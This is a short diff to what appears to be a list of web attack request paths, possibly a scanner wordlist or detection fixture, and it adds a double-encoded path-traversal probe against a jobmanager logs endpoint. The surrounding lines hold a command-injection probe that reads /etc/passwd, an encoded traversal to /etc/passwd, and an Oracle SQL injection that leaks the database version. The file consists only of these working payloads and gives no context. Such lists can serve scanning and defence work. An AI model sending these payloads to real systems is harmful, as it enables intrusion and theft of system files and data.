@@ -4,3 +4,4 @@
 /poc.jsp?cmd=cat+%2Fetc%2Fpasswd
 /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
 /?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20%20OR%20(1%2B1
+/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc
